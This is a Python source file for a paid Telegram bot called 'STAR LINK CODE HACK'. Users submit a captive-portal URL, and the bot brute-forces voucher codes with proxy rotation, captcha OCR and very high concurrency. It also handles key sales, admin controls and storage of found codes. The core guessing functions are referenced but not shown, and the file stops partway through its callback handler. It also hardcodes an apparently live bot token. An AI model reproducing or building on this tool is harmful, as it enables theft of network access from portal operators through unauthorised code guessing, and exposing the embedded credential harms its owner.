# -*- coding: utf-8 -*-
import telebot
import asyncio
import aiohttp
import json
import base64
import random
import re
import os
import string
import time
import uuid
import threading
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone
import sqlite3
from contextlib import contextmanager

BOT_TOKEN = "8733777636:AAFiV8Za1mOYpZ7nDrD_6SKrt5F18khGWbk"
ADMIN_IDS = ["5614222523"]
ADMIN_USERNAMES = {"gyann_2026_bot"}
FORWARD_CHANNEL = "@gyann_2026_bot"

MAX_CONCURRENT = 15000
BATCH_SIZE = 5000
CONNECTION_LIMIT = 30000
CONNECTION_PER_HOST = 15000
TIMEOUT = 25

DB_PATH = "bot_data.db"

def get_db_connection():
    conn = sqlite3.connect(DB_PATH, timeout=30, check_same_thread=False)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    conn.execute("PRAGMA cache_size=10000")
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS keys (key TEXT PRIMARY KEY, user_id TEXT, plan TEXT, expires_at TEXT, code_limit INTEGER DEFAULT 1000, used_codes INTEGER DEFAULT 0)")
    c.execute("CREATE TABLE IF NOT EXISTS results (user_id TEXT PRIMARY KEY, codes TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS users (user_id TEXT PRIMARY KEY, key TEXT, registered_at TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS user_settings (user_id TEXT PRIMARY KEY, proxy_enabled INTEGER DEFAULT 1)")
    c.execute("CREATE TABLE IF NOT EXISTS proxies (id INTEGER PRIMARY KEY AUTOINCREMENT, proxy TEXT UNIQUE, added_by TEXT, added_at TEXT, active INTEGER DEFAULT 1)")
    conn.commit()
    conn.close()

init_db()

user_data = {}
approve = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
paid_users = {}
proxy_input_state = {}
_voucher_sem = None
_start_time = time.monotonic()

PROXY_LIST = []
_proxy_index = 0

def get_next_proxy():
    global _proxy_index
    proxies = db_get_all_proxies()
    if not proxies:
        return None
    proxy = proxies[_proxy_index % len(proxies)]
    _proxy_index = _proxy_index + 1
    if not proxy.startswith('http://') and not proxy.startswith('https://'):
        proxy = "http://" + proxy
    return proxy

SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)

def repair_text(text):
    if not isinstance(text, str):
        return text
    if not any(marker in text for marker in ("â", "Ã", "ðŸ", "á")):
        return text
    try:
        repaired = text.encode("latin1").decode("utf-8")
        return repaired
    except Exception:
        return text

def is_admin(user_id, username=None):
    if str(user_id) in ADMIN_IDS:
        return True
    if username:
        uname = username.lstrip("@").lower()
        for name in ADMIN_USERNAMES:
            if name.lstrip("@").lower() == uname:
                return True
    return False

@contextmanager
def get_db_cursor():
    conn = get_db_connection()
    try:
        yield conn.cursor()
        conn.commit()
    finally:
        conn.close()

def db_get_key(key):
    with get_db_cursor() as c:
        c.execute("SELECT * FROM keys WHERE key = ?", (key,))
        result = c.fetchone()
        if result:
            return {"key": result[0], "user_id": result[1], "plan": result[2], "expires_at": result[3], "code_limit": result[4], "used_codes": result[5]}
    return None

def db_get_user(user_id):
    with get_db_cursor() as c:
        c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        result = c.fetchone()
        if result:
            return {"user_id": result[0], "key": result[1], "registered_at": result[2]}
    return None

def db_get_user_by_key(key):
    with get_db_cursor() as c:
        c.execute("SELECT * FROM users WHERE key = ?", (key,))
        result = c.fetchone()
        if result:
            return {"user_id": result[0], "key": result[1], "registered_at": result[2]}
    return None

def db_get_results(user_id):
    with get_db_cursor() as c:
        c.execute("SELECT codes FROM results WHERE user_id = ?", (user_id,))
        result = c.fetchone()
        if result:
            return json.loads(result[0])
    return []

def db_save_results(user_id, codes):
    with get_db_cursor() as c:
        c.execute("INSERT OR REPLACE INTO results (user_id, codes) VALUES (?, ?)", (user_id, json.dumps(codes)))

def db_add_user(user_id, key):
    with get_db_cursor() as c:
        c.execute("INSERT OR REPLACE INTO users (user_id, key, registered_at) VALUES (?, ?, ?)", (user_id, key, datetime.now(timezone.utc).isoformat()))

def db_add_key(key, user_id, plan, expires_at, code_limit):
    with get_db_cursor() as c:
        c.execute("INSERT OR REPLACE INTO keys (key, user_id, plan, expires_at, code_limit, used_codes) VALUES (?, ?, ?, ?, ?, ?)", (key, user_id, plan, expires_at, code_limit, 0))

def db_delete_key(key):
    with get_db_cursor() as c:
        c.execute("DELETE FROM keys WHERE key = ?", (key,))

def db_update_used_codes(key, used_codes):
    with get_db_cursor() as c:
        c.execute("UPDATE keys SET used_codes = ? WHERE key = ?", (used_codes, key))

def db_get_all_keys():
    with get_db_cursor() as c:
        c.execute("SELECT * FROM keys")
        results = c.fetchall()
        keys = {}
        for r in results:
            keys[r[0]] = {"user_id": r[1], "plan": r[2], "expires_at": r[3], "code_limit": r[4], "used_codes": r[5]}
        return keys

def db_get_all_users():
    with get_db_cursor() as c:
        c.execute("SELECT * FROM users")
        results = c.fetchall()
        return [r[0] for r in results]

def db_get_proxy_setting(user_id):
    with get_db_cursor() as c:
        c.execute("SELECT proxy_enabled FROM user_settings WHERE user_id = ?", (user_id,))
        result = c.fetchone()
        if result:
            return bool(result[0])
    return True

def db_set_proxy_setting(user_id, enabled):
    with get_db_cursor() as c:
        c.execute("INSERT OR REPLACE INTO user_settings (user_id, proxy_enabled) VALUES (?, ?)", (user_id, 1 if enabled else 0))

def db_add_proxy(proxy, added_by="system"):
    proxy = proxy.strip()
    if not proxy:
        return False, "Empty"
    if not proxy.startswith('http://') and not proxy.startswith('https://'):
        proxy = "http://" + proxy
    try:
        with get_db_cursor() as c:
            c.execute("INSERT OR IGNORE INTO proxies (proxy, added_by, added_at, active) VALUES (?, ?, ?, 1)", (proxy, added_by, datetime.now(timezone.utc).isoformat()))
            if c.rowcount == 0:
                return False, "Already exists"
        return True, proxy
    except Exception as e:
        return False, str(e)

def db_count_proxies():
    with get_db_cursor() as c:
        c.execute("SELECT COUNT(*) FROM proxies WHERE active = 1")
        return c.fetchone()[0]

def db_get_all_proxies():
    with get_db_cursor() as c:
        c.execute("SELECT proxy FROM proxies ORDER BY id")
        return [r[0] for r in c.fetchall()]

def db_delete_proxy(proxy):
    with get_db_cursor() as c:
        c.execute("DELETE FROM proxies WHERE proxy = ?", (proxy,))
        return c.rowcount > 0

def db_delete_all_proxies():
    with get_db_cursor() as c:
        c.execute("DELETE FROM proxies")
        return c.rowcount

def db_bulk_add_proxies(text, added_by="admin"):
    lines = [l.strip() for l in text.split('\n') if l.strip()]
    added = 0
    skipped = 0
    for line in lines:
        ok, _ = db_add_proxy(line, added_by)
        if ok:
            added = added + 1
        else:
            skipped = skipped + 1
    return added, skipped

def check_key_expiration(expires_at):
    try:
        if expires_at == "9999-12-31T23:59:59Z":
            return True
        exp_time = datetime.fromisoformat(expires_at.replace("Z", "+00:00"))
        return datetime.now(timezone.utc) < exp_time
    except Exception:
        return False

def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    plans = {"30m": timedelta(minutes=30), "1h": timedelta(hours=1), "1d": timedelta(days=1), "7d": timedelta(days=7), "1m": timedelta(days=30), "1y": timedelta(days=365), "unlimited": None}
    if plan not in plans:
        return None
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    return (now + plans[plan]).isoformat()

def generate_random_key(length=12):
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

async def forward_to_channel(message_text, parse_mode=None):
    if not FORWARD_CHANNEL:
        return
    try:
        await bot.send_message(FORWARD_CHANNEL, message_text, parse_mode=parse_mode)
    except Exception as e:
        print("Forward error: " + str(e))# ==================== KEYBOARDS ====================

def get_main_keyboard(user_id=None):
    keyboard = InlineKeyboardMarkup(row_width=2)
    if user_id:
        proxy_enabled = db_get_proxy_setting(user_id)
        if proxy_enabled:
            proxy_text = "🟢 Proxy ON"
            proxy_callback = "menu_proxy_off"
        else:
            proxy_text = "🔴 Proxy OFF"
            proxy_callback = "menu_proxy_on"
    else:
        proxy_text = "🟢 Proxy ON"
        proxy_callback = "menu_proxy_off"
    proxy_count = db_count_proxies()
    keyboard.add(
        InlineKeyboardButton("🎫 PAID USER", callback_data="menu_paid"),
        InlineKeyboardButton("🔗 Portal URL", callback_data="menu_free_trial"),
        InlineKeyboardButton(proxy_text, callback_data=proxy_callback),
        InlineKeyboardButton("➕ Add Proxies (" + str(proxy_count) + ")", callback_data="menu_add_proxies"),
        InlineKeyboardButton("📋 Success Codes", callback_data="menu_result"),
        InlineKeyboardButton("🔄 Recheck", callback_data="menu_recheck"),
        InlineKeyboardButton("🛑 Stop Scan", callback_data="menu_stop"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_proxy_menu_keyboard():
    count = db_count_proxies()
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("➕ Add Proxies", callback_data="proxy_add"),
        InlineKeyboardButton("📋 List Proxies (" + str(count) + ")", callback_data="proxy_list"),
        InlineKeyboardButton("🧹 Clear All", callback_data="proxy_clear"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_voucher_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🔢 DIGIT 6", callback_data="scan_6"),
        InlineKeyboardButton("🔢 DIGIT 7", callback_data="scan_7"),
        InlineKeyboardButton("🔢 DIGIT 8", callback_data="scan_8"),
        InlineKeyboardButton("🔤 lower 6", callback_data="scan_engsmall6"),
        InlineKeyboardButton("🔤 lower 7", callback_data="scan_engsmall7"),
        InlineKeyboardButton("🔤 lower 8", callback_data="scan_engsmall8"),
        InlineKeyboardButton("🔤+🔢 MIX 6", callback_data="scan_engmixed6"),
        InlineKeyboardButton("🔤+🔢 MIX 7", callback_data="scan_engmixed7"),
        InlineKeyboardButton("🔤+🔢 MIX 8", callback_data="scan_engmixed8"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_digit_keyboard(mode):
    keyboard = InlineKeyboardMarkup(row_width=5)
    buttons = []
    for i in range(10):
        buttons.append(InlineKeyboardButton(str(i), callback_data="digit_" + mode + "_" + str(i)))
    keyboard.add(*buttons)
    keyboard.add(InlineKeyboardButton("🎲 Random", callback_data="digit_" + mode + "_random"))
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return keyboard

def get_start_scam_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("🚀 START SCAN", callback_data="menu_start_scam"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_paid_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("✅ KEY ထည့်ရန်", callback_data="menu_enter_key"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_back_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return keyboard

def get_scam_button_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("🛑 STOP SCAN", callback_data="menu_stop"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_admin_main_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🔑 Generate Key", callback_data="admin_genkey"),
        InlineKeyboardButton("🗑️ Delete Key", callback_data="admin_delkey"),
        InlineKeyboardButton("📋 List Keys", callback_data="admin_listkeys"),
        InlineKeyboardButton("📊 Bot Stats", callback_data="admin_stats"),
        InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"),
        InlineKeyboardButton("👥 Users List", callback_data="admin_users"),
        InlineKeyboardButton("🔙 Back", callback_data="admin_back")
    )
    return keyboard

def get_admin_genkey_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("⏱️ 30m", callback_data="admin_gen_30m"),
        InlineKeyboardButton("⏱️ 1h", callback_data="admin_gen_1h"),
        InlineKeyboardButton("📅 1d", callback_data="admin_gen_1d"),
        InlineKeyboardButton("📅 7d", callback_data="admin_gen_7d"),
        InlineKeyboardButton("📅 1m", callback_data="admin_gen_1m"),
        InlineKeyboardButton("📅 1y", callback_data="admin_gen_1y"),
        InlineKeyboardButton("♾️ Unlimited", callback_data="admin_gen_unlimited"),
        InlineKeyboardButton("🔙 Back", callback_data="admin_back")
    )
    return keyboard

def get_admin_back_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_back"))
    return keyboard

# ==================== BOT HANDLERS ====================

@bot.message_handler(commands=['start'])
async def start(message):
    user_id = str(message.chat.id)
    user_name = message.from_user.first_name or message.from_user.username or "User"
    if message.chat.id not in user_data:
        user_data[message.chat.id] = {}
    if is_admin(user_id, getattr(message.from_user, "username", None)):
        approve[message.chat.id] = True
        paid_users[user_id] = True
        valid = True
    else:
        user_info = db_get_user(user_id)
        valid = False
        if user_info:
            key_info = db_get_key(user_info["key"])
            if key_info and check_key_expiration(key_info["expires_at"]):
                valid = True
                approve[message.chat.id] = True
                paid_users[user_id] = True
    proxy_status = "ON" if db_get_proxy_setting(user_id) else "OFF"
    proxy_count = db_count_proxies()
    if valid:
        welcome_text = "STAR LINK CODE HACK\n\n"
        welcome_text = welcome_text + "NAME: " + user_name + "\n"
        welcome_text = welcome_text + "USER ID: " + user_id + "\n\n"
        welcome_text = welcome_text + "PAID USER\n"
        welcome_text = welcome_text + "Proxy: " + proxy_status + " (" + str(proxy_count) + " loaded)\n\n"
        welcome_text = welcome_text + "Menu မှ ရွေးပါ။"
    else:
        welcome_text = "STAR LINK CODE HACK\n\n"
        welcome_text = welcome_text + "NAME: " + user_name + "\n"
        welcome_text = welcome_text + "USER ID: " + user_id + "\n\n"
        welcome_text = welcome_text + "Registered မလုပ်ရသေးပါ။"
    await bot.send_message(message.chat.id, welcome_text, reply_markup=get_main_keyboard(user_id))

@bot.message_handler(commands=['admin'])
async def admin_panel(message):
    if not is_admin(str(message.chat.id), getattr(message.from_user, "username", None)):
        await bot.reply_to(message, "Admin မဟုတ်ပါ။")
        return
    text = "Admin Panel\n\nရွေးပါ:"
    await bot.reply_to(message, text, reply_markup=get_admin_main_keyboard())

@bot.message_handler(commands=['key'])
async def handle_key(message):
    user_id = str(message.chat.id)
    if is_admin(user_id, getattr(message.from_user, "username", None)):
        await bot.reply_to(message, "Admin - KEY မလိုပါ။")
        return
    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(message, "/key [your_key]")
        return
    key = args[1].strip()
    key_info = db_get_key(key)
    if not key_info:
        await bot.reply_to(message, "KEY မမှန်ပါ။")
        return
    if not check_key_expiration(key_info["expires_at"]):
        await bot.reply_to(message, "KEY Expired။")
        return
    db_add_user(user_id, key)
    approve[message.chat.id] = True
    paid_users[user_id] = True
    if message.chat.id not in user_data:
        user_data[message.chat.id] = {}
    msg = "PAID USER ဖြစ်ပါပြီ။\n\n"
    msg = msg + "KEY: " + key + "\n"
    msg = msg + "Plan: " + key_info["plan"] + "\n"
    msg = msg + "Limit: " + str(key_info["code_limit"])
    await bot.reply_to(message, msg)

@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if not is_admin(str(message.chat.id), getattr(message.from_user, "username", None)):
        await bot.reply_to(message, "No Permission")
        return
    try:
        args = message.text.split()
        if len(args) < 4:
            await bot.reply_to(message, "Usage: /genkey [plan] [limit] [user_id]")
            return
        plan = args[1]
        try:
            code_limit = int(args[2])
        except Exception:
            await bot.reply_to(message, "Code limit must be number")
            return
        user_id = args[3]
        expiry = generate_expiry(plan)
        if not expiry:
            await bot.reply_to(message, "Plan မမှန်။")
            return
        new_key = generate_random_key(12)
        db_add_key(new_key, user_id, plan, expiry, code_limit)
        msg = "Key Generated\n\n"
        msg = msg + "KEY: " + new_key + "\n"
        msg = msg + "USER: " + user_id + "\n"
        msg = msg + "PLAN: " + plan + "\n"
        msg = msg + "LIMIT: " + str(code_limit) + "\n"
        msg = msg + "EXPIRES: " + expiry
        await bot.reply_to(message, msg)
        try:
            await bot.send_message(int(user_id), "KEY: " + new_key + "\nPlan: " + plan + "\nLimit: " + str(code_limit) + "\n\n/key " + new_key)
        except Exception:
            pass
    except Exception as e:
        await bot.reply_to(message, "Error: " + str(e))

@bot.message_handler(commands=['delkey'])
async def delkey(message):
    if not is_admin(str(message.chat.id), getattr(message.from_user, "username", None)):
        await bot.reply_to(message, "No Permission")
        return
    try:
        args = message.text.split()
        if len(args) < 2:
            await bot.reply_to(message, "Usage: /delkey [key]")
            return
        key = args[1]
        key_info = db_get_key(key)
        if not key_info:
            await bot.reply_to(message, "Key မတွေ့။")
            return
        user_info = db_get_user_by_key(key)
        if user_info:
            approve.pop(int(user_info["user_id"]), None)
            paid_users.pop(user_info["user_id"], None)
            user_data.pop(int(user_info["user_id"]), None)
        db_delete_key(key)
        await bot.reply_to(message, "Deleted: " + key)
    except Exception as e:
        print("delkey error: " + str(e))

@bot.message_handler(commands=['sendall'])
async def send_all_broadcast(message):
    if not is_admin(str(message.chat.id), getattr(message.from_user, "username", None)):
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /sendall [message]")
        return
    broadcast_text = "ADMIN: " + args[1]
    users = db_get_all_users()
    count = 0
    for uid in users:
        try:
            await bot.send_message(int(uid), broadcast_text)
            count = count + 1
            await asyncio.sleep(0.1)
        except Exception:
            continue
    await bot.reply_to(message, "Sent to " + str(count) + " users")

@bot.message_handler(commands=['status'])
async def status_cmd(message):
    if not is_admin(str(message.chat.id), getattr(message.from_user, "username", None)):
        await bot.reply_to(message, "No Permission")
        return
    keys = db_get_all_keys()
    users = db_get_all_users()
    active_scans = 0
    for d in scan_tasks.values():
        if not d["task"].done():
            active_scans = active_scans + 1
    uptime = int(time.monotonic() - _start_time)
    h, r = divmod(uptime, 3600)
    m, s = divmod(r, 60)
    msg = "Stats\n\n"
    msg = msg + "Uptime: " + str(h) + "h " + str(m) + "m " + str(s) + "s\n"
    msg = msg + "Active: " + str(active_scans) + "\n"
    msg = msg + "Users: " + str(len(users)) + "\n"
    msg = msg + "Keys: " + str(len(keys)) + "\n"
    msg = msg + "Proxies: " + str(db_count_proxies())
    await bot.reply_to(message, msg)

# ==================== PROXY COMMANDS ====================

@bot.message_handler(commands=['addproxy'])
async def add_proxy_cmd(message):
    user_id = str(message.chat.id)
    if user_id not in paid_users and user_id not in approve and not is_admin(user_id, getattr(message.from_user, "username", None)):
        await bot.reply_to(message, "PAID USER မဟုတ်ပါ။")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /addproxy user:pass@host:port")
        return
    ok, result = db_add_proxy(args[1].strip(), added_by=user_id)
    if ok:
        await bot.reply_to(message, "Added\n\nTotal: " + str(db_count_proxies()) + "\n" + result)
    else:
        await bot.reply_to(message, "Error: " + result)

@bot.message_handler(commands=['addproxies'])
async def add_proxies_bulk_cmd(message):
    user_id = str(message.chat.id)
    if user_id not in paid_users and user_id not in approve and not is_admin(user_id, getattr(message.from_user, "username", None)):
        await bot.reply_to(message, "PAID USER မဟုတ်ပါ။")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage:\n/addproxies\nproxy1\nproxy2")
        return
    added, skipped = db_bulk_add_proxies(args[1], added_by=user_id)
    msg = "Bulk Add Complete\n\n"
    msg = msg + "Added: " + str(added) + "\n"
    msg = msg + "Skipped: " + str(skipped) + "\n"
    msg = msg + "Total: " + str(db_count_proxies())
    await bot.reply_to(message, msg)

@bot.message_handler(commands=['delproxy'])
async def del_proxy_cmd(message):
    user_id = str(message.chat.id)
    if user_id not in paid_users and user_id not in approve and not is_admin(user_id, getattr(message.from_user, "username", None)):
        await bot.reply_to(message, "PAID USER မဟုတ်ပါ။")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /delproxy 1.2.3.4:8080")
        return
    proxy = args[1].strip()
    if not proxy.startswith('http://') and not proxy.startswith('https://'):
        proxy = "http://" + proxy
    if db_delete_proxy(proxy):
        await bot.reply_to(message, "Deleted\nRemaining: " + str(db_count_proxies()))
    else:
        await bot.reply_to(message, "Proxy မတွေ့။")

@bot.message_handler(commands=['listproxies'])
async def list_proxies_cmd(message):
    user_id = str(message.chat.id)
    if user_id not in paid_users and user_id not in approve and not is_admin(user_id, getattr(message.from_user, "username", None)):
        await bot.reply_to(message, "PAID USER မဟုတ်ပါ။")
        return
    proxies = db_get_all_proxies()
    if not proxies:
        await bot.reply_to(message, "Proxy မရှိ။")
        return
    lines = []
    for i, p in enumerate(proxies[:50]):
        lines.append(str(i + 1) + ". " + p)
    text = "Proxies (" + str(len(proxies)) + ")\n\n" + "\n".join(lines)
    if len(proxies) > 50:
        text = text + "\n\n... +" + str(len(proxies) - 50) + " more"
    await bot.reply_to(message, text)

@bot.message_handler(func=lambda m: proxy_input_state.get(m.chat.id, False), content_types=['text'])
async def handle_proxy_input(message):
    chat_id = message.chat.id
    user_id = str(chat_id)
    text = message.text.strip()
    if text.lower() in ['/cancel', 'cancel', 'back', 'exit']:
        proxy_input_state[chat_id] = False
        await bot.reply_to(message, "Cancelled", reply_markup=get_main_keyboard(user_id))
        return
    proxy_input_state[chat_id] = False
    if user_id not in paid_users and user_id not in approve and not is_admin(user_id, getattr(message.from_user, "username", None)):
        await bot.reply_to(message, "PAID USER မဟုတ်ပါ။")
        return
    added, skipped = db_bulk_add_proxies(text, added_by=user_id)
    total = db_count_proxies()
    msg = "Add Proxies Complete\n\n"
    msg = msg + "Added: " + str(added) + "\n"
    msg = msg + "Skipped: " + str(skipped) + "\n"
    msg = msg + "Total: " + str(total)
    await bot.reply_to(message, msg, reply_markup=get_main_keyboard(user_id))# ==================== USER COMMANDS ====================

@bot.message_handler(commands=['portal'])
async def handle_portal(message):
    user_id = str(message.chat.id)
    if is_admin(user_id, getattr(message.from_user, "username", None)):
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            await bot.reply_to(message, "Usage: /portal [url]")
            return
        if message.chat.id not in user_data:
            user_data[message.chat.id] = {}
        user_data[message.chat.id]['session_url'] = args[1]
        await bot.reply_to(message, "Portal saved (Admin)", reply_markup=get_voucher_keyboard())
        return
    if user_id not in paid_users and user_id not in approve:
        await bot.reply_to(message, "Registered မလုပ်ရသေးပါ။")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /portal [url]")
        return
    if message.chat.id not in user_data:
        user_data[message.chat.id] = {}
    user_data[message.chat.id]['session_url'] = args[1]
    await bot.reply_to(message, "Portal saved", reply_markup=get_voucher_keyboard())

@bot.message_handler(commands=['scan'])
async def handle_scan(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /scan [mode]", reply_markup=get_voucher_keyboard())
        return
    mode = args[1]
    chat_id = message.chat.id
    user_id = str(chat_id)
    if user_id not in paid_users and user_id not in approve:
        await bot.reply_to(message, "Registered မလုပ်ရသေးပါ။")
        return
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "Portal URL အရင်ထည့်ပါ။")
        return
    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        await bot.reply_to(message, "Scan ရှိပြီးသား။ STOP လုပ်ပါ။")
        return
    progress_msg = await bot.send_message(chat_id, "Scanning...\n\n")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id, message=message, progress_msg=progress_msg))
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}

@bot.message_handler(commands=['stop'])
async def stop_scan_command(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["scan_id"] = None
        await send_success_file(chat_id)
        data["task"].cancel()
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        await bot.reply_to(message, "Scan Stopped", reply_markup=get_back_keyboard())
    else:
        await bot.reply_to(message, "Scan မရှိ။", reply_markup=get_back_keyboard())

@bot.message_handler(commands=['result'])
async def handle_result(message):
    user_id = str(message.chat.id)
    if user_id not in paid_users and user_id not in approve:
        await bot.reply_to(message, "Registered မလုပ်ရသေးပါ။")
        return
    results = db_get_results(user_id)
    if results:
        codes = "\n".join(results)
        await bot.reply_to(message, "Found Codes:\n" + codes)
    else:
        await bot.reply_to(message, "Code မရှိသေးပါ။")

@bot.message_handler(commands=['recheck'])
async def recheck_command(message):
    chat_id = message.chat.id
    user_id = str(chat_id)
    if user_id not in paid_users and user_id not in approve:
        await bot.reply_to(message, "Registered မလုပ်ရသေးပါ။")
        return
    results = db_get_results(user_id)
    if not results:
        await bot.reply_to(message, "Success code မရှိသေးပါ။")
        return
    if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
        await bot.reply_to(message, "Portal URL အရင်ထည့်ပါ။")
        return
    await bot.reply_to(message, "Rechecking...")
    session_url_recheck = user_data[chat_id]["session_url"]
    recheck_list = []
    for code in results:
        recode = await perform_check(session_url_recheck, code, chat_id, scan_id=None, recheck=True, message=message)
        if recode:
            recheck_list.append(recode)
    if recheck_list:
        to_show = "\n".join(recheck_list)
        await bot.reply_to(message, "Rechecked Codes:\n\n" + to_show)
        db_save_results(user_id, recheck_list)
    else:
        await bot.reply_to(message, "Code များ စစ်ပြီး Success မတွေ့ပါ။")

@bot.message_handler(commands=['proxy'])
async def proxy_command(message):
    user_id = str(message.chat.id)
    if user_id not in paid_users and user_id not in approve:
        await bot.reply_to(message, "PAID USER မဟုတ်ပါ။")
        return
    current = db_get_proxy_setting(user_id)
    new_status = not current
    db_set_proxy_setting(user_id, new_status)
    status_text = "ON" if new_status else "OFF"
    await bot.reply_to(message, "Proxy " + status_text)

# ==================== ADMIN HELPERS ====================

async def listkeys_command(message):
    keys = db_get_all_keys()
    if not keys:
        await bot.reply_to(message, "Key မရှိ။")
        return
    lines = []
    for key, data in keys.items():
        user_info = db_get_user_by_key(key)
        uid = user_info["user_id"] if user_info else "Not Registered"
        if data["expires_at"] == "9999-12-31T23:59:59Z":
            expires_str = "Unlimited"
        else:
            try:
                exp_dt = datetime.fromisoformat(data["expires_at"].replace("Z", "+00:00"))
                now = datetime.now(timezone.utc)
                if exp_dt < now:
                    expires_str = "Expired"
                else:
                    diff = exp_dt - now
                    days = diff.days
                    hours, rem = divmod(diff.seconds, 3600)
                    minutes = rem // 60
                    expires_str = str(days) + "d " + str(hours) + "h " + str(minutes) + "m"
            except Exception:
                expires_str = data["expires_at"]
        line = "Key: " + key + "\n"
        line = line + "User: " + uid + "\n"
        line = line + "Plan: " + data['plan'] + "\n"
        line = line + "Limit: " + str(data['used_codes']) + "/" + str(data['code_limit']) + "\n"
        line = line + "Expires: " + expires_str
        lines.append(line)
    text = "Keys (" + str(len(keys)) + ")\n\n" + "\n\n".join(lines)
    if len(text) > 4000:
        for i in range(0, len(text), 4000):
            await bot.send_message(message.chat.id, text[i:i+4000])
    else:
        await bot.reply_to(message, text)

async def stats_command(message):
    keys = db_get_all_keys()
    users = db_get_all_users()
    active_keys = 0
    for key, data in keys.items():
        if check_key_expiration(data["expires_at"]):
            active_keys = active_keys + 1
    active_scans = 0
    for data in scan_tasks.values():
        if not data["task"].done():
            active_scans = active_scans + 1
    uptime = int(time.monotonic() - _start_time)
    h, r = divmod(uptime, 3600)
    m, s = divmod(r, 60)
    text = "Bot Stats\n\n"
    text = text + "Uptime: " + str(h) + "h " + str(m) + "m " + str(s) + "s\n"
    text = text + "Active Scans: " + str(active_scans) + "\n"
    text = text + "PAID Users: " + str(len(paid_users)) + "\n"
    text = text + "Total Keys: " + str(len(keys)) + "\n"
    text = text + "Active Keys: " + str(active_keys) + "\n"
    text = text + "Users: " + str(len(users)) + "\n"
    text = text + "Proxies: " + str(db_count_proxies())
    await bot.reply_to(message, text)

async def users_list_command(message):
    users = db_get_all_users()
    if not users:
        await bot.reply_to(message, "User မရှိ။")
        return
    lines = []
    for uid in users:
        user_info = db_get_user(uid)
        if user_info:
            key_info = db_get_key(user_info["key"])
            if key_info:
                status = "Active" if check_key_expiration(key_info["expires_at"]) else "Expired"
                line = "ID: " + uid + "\n"
                line = line + "Key: " + user_info['key'] + "\n"
                line = line + "Plan: " + key_info['plan'] + "\n"
                line = line + "Status: " + status
                lines.append(line)
    text = "Users (" + str(len(users)) + ")\n\n" + "\n\n".join(lines)
    if len(text) > 4000:
        for i in range(0, len(text), 4000):
            await bot.send_message(message.chat.id, text[i:i+4000])
    else:
        await bot.reply_to(message, text)

# ==================== CALLBACK HANDLER ====================

@bot.callback_query_handler(func=lambda call: True)
async def callback_handler(call):
    chat_id = call.message.chat.id
    user_id = str(chat_id)
    user_name = call.from_user.first_name or call.from_user.username or "User"

    if call.data.startswith("scan_"):
        if user_id not in paid_users and user_id not in approve:
            if is_admin(user_id, getattr(call.from_user, "username", None)):
                approve[chat_id] = True
                paid_users[user_id] = True
            else:
                await bot.answer_callback_query(call.id, "PAID USER မဟုတ်ပါ။")
                return
